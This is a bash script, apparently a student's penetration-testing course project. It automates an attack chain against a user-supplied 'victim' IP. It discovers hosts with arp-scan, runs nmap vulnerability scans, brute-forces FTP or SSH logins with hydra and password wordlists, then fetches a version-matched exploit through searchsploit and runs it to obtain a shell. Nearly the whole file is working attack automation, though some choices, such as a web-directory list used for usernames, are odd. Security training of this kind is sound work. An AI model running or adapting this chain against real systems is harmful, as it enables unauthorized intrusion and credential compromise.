#!/bin/bash



#Name: Segev Danoch
#Class code:7736/13
#Lecturer's name: Adonis Azzam+

#Farmvile
echo "Active Script as root do not use sudo !"

sleep 1

cowsay "Have fun,Sit back and mooooolex"


#Making sure the script runs as root
if [[ $EUID -ne 0 ]]; then
    echo "script is not running as root. Try using sudo."
    exit 
fi

#scanning the network of the vulnerable machine's ip
function sas () {

arp-scan -l |  grep 192 | grep -v  Interface | awk '{print $1}'

}
sas

#Doing vulnerability scan, saves the result in xml file and then converting it to html file.
function nilf  () {

echo "Please enter your victim's Ip:"

read x


nmap $x -p21 --script vuln -oX result.xml 
xsltproc result.xml -o result.html
open result.html &>/dev/null

nmap $x -p22 --script vuln -oX result.xml 
xsltproc result.xml -o result.html
open result.html &>/dev/null
}
nilf


#Giving the user the option to decide which services to attack and then brute forcing that service. 
function ftpr () {

if [[ ! -z $(nmap $x | grep ftp |grep open) ]]
then
echo " Open ports that can be brute forced have been found! :"
echo -e "$(nmap $x |grep "ftp" )"
sleep 2
hydra -L /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 	-P /usr/share/john/password.lst $x ftp -vV -t 4
fi
}
function sshr () {
if [[ ! -z $(nmap $x | grep ssh |grep open) ]] 
then
echo " Open ports that can be brute forced have been found!:"
echo -e "$(nmap $x | grep "ssh" )"
sleep 2
hydra -L /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 	-P /usr/share/john/password.lst $x ssh -vV -t 4
fi
}
echo "please choose a protocol:
ssh
ftp"

#Hacking the vulnerable machine 


function hacking () {

echo "Getting a shell "

V=$(nmap -p21 $x -sV | grep VERSION -A 1 | tail -1 | awk '{print $4" "$5}')

C=$(searchsploit $V | awk '{print $8}')
searchsploit -m $C 
sleep 2
python3 49757.py $x

}


read proto

if [ $proto == ftp ];then ftpr && hacking ; fi
if [ $proto == ssh ];then sshr && echo "Please choose ftp if you wish to get a shell,exiting" ;fi



